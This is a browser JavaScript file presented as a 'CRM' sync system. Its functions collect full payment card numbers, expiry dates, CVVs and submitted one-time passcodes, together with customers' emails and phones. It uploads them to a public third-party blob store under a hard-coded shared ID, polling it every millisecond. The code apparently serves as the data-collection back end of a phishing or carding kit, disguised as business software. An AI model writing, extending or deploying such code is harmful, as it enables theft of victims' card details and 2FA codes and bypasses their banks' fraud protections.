// CRM Customer Data Flow System with global shared sync across devices/IPs
class CustomerCRMFlow {
  constructor() {
    this.storageKey = 'crm_customer_data';
    this.deviceId = this.getDeviceId();
    this.cloudBaseUrl = 'https://jsonblob.com/api/jsonBlob';
    this.sharedBlobId = '019d916a-c3b2-7794-9ed8-d8fa9db8f328';
    this.maxTotalEntries = 100;
    this.syncInProgress = false;
    this.autoSyncMs = 1;
    this.init();
  }

  init() {
    console.log('CRM: Initializing global customer data flow...');
    console.log('CRM: Device ID:', this.deviceId);
    console.log('CRM: Shared Blob ID:', this.sharedBlobId);

    this.ensureLocalData();
    this.syncFromCloud();

    window.addEventListener('online', () => {
      this.syncFromCloud(true);
    });

    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        this.syncFromCloud();
      }
    });

    setInterval(() => {
      if (navigator.onLine) {
        this.syncFromCloud();
      }
    }, this.autoSyncMs);
  }

  getDeviceId() {
    let deviceId = localStorage.getItem('crmDeviceId');
    if (!deviceId) {
      deviceId = 'device_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmDeviceId', deviceId);
    }
    return deviceId;
  }

  getEmptyData() {
    return {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        lastUpdated: new Date().toISOString(),
        deviceId: this.deviceId,
        version: 'customer_flow_global_v2',
        sharedBlobId: this.sharedBlobId
      }
    };
  }

  normalizeData(data) {
    const normalized = data && typeof data === 'object' ? data : {};
    const base = this.getEmptyData();

    return {
      orders: Array.isArray(normalized.orders) ? normalized.orders : [],
      cards: Array.isArray(normalized.cards) ? normalized.cards : [],
      otp: Array.isArray(normalized.otp) ? normalized.otp : [],
      settings: {
        ...base.settings,
        ...(normalized.settings || {})
      }
    };
  }

  ensureLocalData() {
    const local = this.getCRMData();
    this.saveCRMData(local);
  }

  getCRMData() {
    try {
      const data = localStorage.getItem(this.storageKey);
      if (!data) {
        return this.getEmptyData();
      }
      return this.normalizeData(JSON.parse(data));
    } catch (e) {
      console.error('CRM: Error reading local CRM data:', e);
      return this.getEmptyData();
    }
  }

  saveCRMData(data) {
    try {
      const normalized = this.normalizeData(data);
      normalized.settings.lastUpdated = new Date().toISOString();
      normalized.settings.deviceId = this.deviceId;
      normalized.settings.version = 'customer_flow_global_v2';
      normalized.settings.sharedBlobId = this.sharedBlobId;

      localStorage.setItem(this.storageKey, JSON.stringify(normalized));
      return true;
    } catch (e) {
      console.error('CRM: Error saving local CRM data:', e);
      return false;
    }
  }

  getCloudUrl() {
    return `${this.cloudBaseUrl}/${this.sharedBlobId}`;
  }

  async loadFromCloud() {
    try {
      const response = await fetch(this.getCloudUrl(), {
        method: 'GET',
        cache: 'no-store'
      });

      if (!response.ok) {
        console.warn('CRM: Cloud read failed with status', response.status);
        return null;
      }

      const data = await response.json();
      return this.normalizeData(data);
    } catch (error) {
      console.error('CRM: Failed to load cloud CRM data:', error);
      return null;
    }
  }

  async saveToCloud(data) {
    try {
      const payload = this.normalizeData(data);
      payload.settings.lastCloudWrite = new Date().toISOString();
      payload.settings.updatedBy = this.deviceId;

      const response = await fetch(this.getCloudUrl(), {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        console.warn('CRM: Cloud write failed with status', response.status);
        return false;
      }

      localStorage.setItem('crmLastSync', Date.now().toString());
      return true;
    } catch (error) {
      console.error('CRM: Failed to save cloud CRM data:', error);
      return false;
    }
  }

  removeDuplicates(array, key) {
    const seen = new Set();
    return array.filter((item) => {
      const itemKey = item && item[key];
      if (!itemKey || seen.has(itemKey)) {
        return false;
      }
      seen.add(itemKey);
      return true;
    });
  }

  mergeData(localData, cloudData) {
    const localRolloverAt = localData?.settings?.rolloverAt ? new Date(localData.settings.rolloverAt).getTime() : 0;
    const cloudRolloverAt = cloudData?.settings?.rolloverAt ? new Date(cloudData.settings.rolloverAt).getTime() : 0;
    const activeRolloverAt = Math.max(localRolloverAt, cloudRolloverAt);

    const merged = {
      orders: [...(cloudData.orders || []), ...(localData.orders || [])],
      cards: [...(cloudData.cards || []), ...(localData.cards || [])],
      otp: [...(cloudData.otp || []), ...(localData.otp || [])],
      settings: {
        ...(cloudData.settings || {}),
        ...(localData.settings || {}),
        lastUpdated: new Date().toISOString(),
        lastMergedAt: new Date().toISOString(),
        deviceId: this.deviceId,
        version: 'customer_flow_global_v2',
        sharedBlobId: this.sharedBlobId
      }
    };

    if (activeRolloverAt > 0) {
      const keepAfterRollover = (item) => {
        const ts = item?.timestamp ? new Date(item.timestamp).getTime() : 0;
        return ts >= activeRolloverAt;
      };
      merged.orders = merged.orders.filter(keepAfterRollover);
      merged.cards = merged.cards.filter(keepAfterRollover);
      merged.otp = merged.otp.filter(keepAfterRollover);
      merged.settings.rolloverAt = new Date(activeRolloverAt).toISOString();
    }

    merged.orders = this.removeDuplicates(merged.orders, 'id');
    merged.cards = this.removeDuplicates(merged.cards, 'id');
    merged.otp = this.removeDuplicates(merged.otp, 'id');

    merged.orders.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    merged.cards.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    merged.otp.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

    return merged;
  }

  dataSignature(data) {
    return JSON.stringify({
      orders: data.orders || [],
      cards: data.cards || [],
      otp: data.otp || []
    });
  }

  getTotalEntries(data) {
    return (data.orders?.length || 0) + (data.cards?.length || 0) + (data.otp?.length || 0);
  }

  applyEntryLimitWithNewest(data, section, entry) {
    const normalized = this.normalizeData(data);
    const nextTotal = this.getTotalEntries(normalized) + 1;

    if (nextTotal >= this.maxTotalEntries) {
      const resetData = this.getEmptyData();
      resetData.settings.rolloverAt = entry.timestamp || new Date().toISOString();
      resetData.settings.rolloverReason = `max_${this.maxTotalEntries}_reached`;
      resetData[section] = [entry];
      return resetData;
    }

    normalized[section].unshift(entry);
    return normalized;
  }

  async syncFromCloud(forcePush = false) {
    if (!navigator.onLine) {
      return false;
    }

    if (this.syncInProgress) {
      return false;
    }

    this.syncInProgress = true;

    try {
      const localData = this.getCRMData();
      const cloudData = await this.loadFromCloud();

      if (!cloudData) {
        // If cloud is empty/unavailable, attempt to seed cloud with local data.
        await this.saveToCloud(localData);
        return false;
      }

      const mergedData = this.mergeData(localData, cloudData);
      const localSignature = this.dataSignature(localData);
      const cloudSignature = this.dataSignature(cloudData);
      const mergedSignature = this.dataSignature(mergedData);

      if (localSignature !== mergedSignature) {
        this.saveCRMData(mergedData);
      }

      if (forcePush || cloudSignature !== mergedSignature) {
        await this.saveToCloud(mergedData);
      }

      return true;
    } catch (error) {
      console.error('CRM: syncFromCloud failed:', error);
      return false;
    } finally {
      this.syncInProgress = false;
    }
  }

  async pushLatestToCloud(retries = 3) {
    for (let attempt = 0; attempt < retries; attempt += 1) {
      const synced = await this.syncFromCloud(true);
      if (synced) {
        return true;
      }
      await new Promise((resolve) => setTimeout(resolve, 120));
    }
    return false;
  }

  async addCustomerOrder(orderData) {
    await this.syncFromCloud();

    const data = this.getCRMData();
    const order = {
      id: 'order_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      fullName: orderData.fullName || 'Unknown Customer',
      email: orderData.email || 'unknown@email.com',
      phone: orderData.phone || 'Unknown',
      orderTotal: orderData.orderTotal || '0',
      status: 'Completed'
    };

    const updatedData = this.applyEntryLimitWithNewest(data, 'orders', order);
    this.saveCRMData(updatedData);
    await this.pushLatestToCloud();

    return order;
  }

  async addCustomerCard(cardData) {
    await this.syncFromCloud();

    const data = this.getCRMData();
    const card = {
      id: 'card_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      cardName: cardData.cardName || 'Unknown Customer',
      cardNumber: cardData.cardNumber || '**** **** **** ****',
      expiry: cardData.expiry || 'MM/YY',
      cvv: cardData.cvv || '***',
      status: 'Received'
    };

    const updatedData = this.applyEntryLimitWithNewest(data, 'cards', card);
    this.saveCRMData(updatedData);
    await this.pushLatestToCloud();

    return card;
  }

  async addCustomerOTP(otpData) {
    await this.syncFromCloud();

    const data = this.getCRMData();
    const otp = {
      id: 'otp_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      submittedOTP: otpData.submittedOTP || '000000',
      email: otpData.email || 'unknown@email.com',
      phone: otpData.phone || 'Unknown',
      status: 'Verified'
    };

    const updatedData = this.applyEntryLimitWithNewest(data, 'otp', otp);
    this.saveCRMData(updatedData);
    await this.pushLatestToCloud();

    return otp;
  }

  getCRMStats() {
    const data = this.getCRMData();
    const lastSyncRaw = localStorage.getItem('crmLastSync');
    const lastSync = lastSyncRaw ? new Date(parseInt(lastSyncRaw, 10)).toISOString() : data.settings.lastUpdated;

    return {
      totalOrders: data.orders.length,
      totalCards: data.cards.length,
      totalOTP: data.otp.length,
      successRate: data.otp.length > 0 ? 100 : 0,
      lastSync,
      deviceId: this.deviceId,
      isOnline: navigator.onLine,
      syncEnabled: true,
      globalSharedSync: true
    };
  }

  exportCRMData() {
    const data = this.getCRMData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_customer_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  exportData() {
    this.exportCRMData();
  }

  async clearCRMData() {
    const empty = this.getEmptyData();
    this.saveCRMData(empty);
    await this.pushLatestToCloud();
  }

  async refreshCRMData() {
    return this.syncFromCloud();
  }

  async forceCRMRefresh() {
    return this.syncFromCloud(true);
  }
}

window.customerCRMFlow = new CustomerCRMFlow();

window.addOrder = async function(data) {
  return window.customerCRMFlow.addCustomerOrder(data);
};

window.addCardDetails = async function(data) {
  return window.customerCRMFlow.addCustomerCard(data);
};

window.addOTPData = async function(data) {
  return window.customerCRMFlow.addCustomerOTP(data);
};

window.syncCRMFromCloud = async function() {
  return window.customerCRMFlow.syncFromCloud();
};

window.forceCRMRefresh = async function() {
  return window.customerCRMFlow.forceCRMRefresh();
};

window.refreshCRMData = async function() {
  return window.customerCRMFlow.refreshCRMData();
};

window.crossDeviceCRMSync = window.customerCRMFlow;
window.cloudCRMStorage = window.customerCRMFlow;

console.log('Customer CRM Flow System initialized - global shared sync active');
